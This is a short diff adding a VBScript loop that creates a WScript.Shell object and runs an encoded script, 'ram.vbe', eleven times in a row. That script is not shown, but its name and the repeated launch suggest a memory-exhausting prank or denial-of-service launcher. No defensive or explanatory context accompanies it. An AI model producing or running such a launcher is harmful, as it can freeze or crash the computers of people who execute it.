@@ -1,0 +1,4 @@
+for i=0 to 10
+Set GZ = WScript.CreateObject("WScript.Shell")
+Return = GZ.Run("ram.vbe")
+next
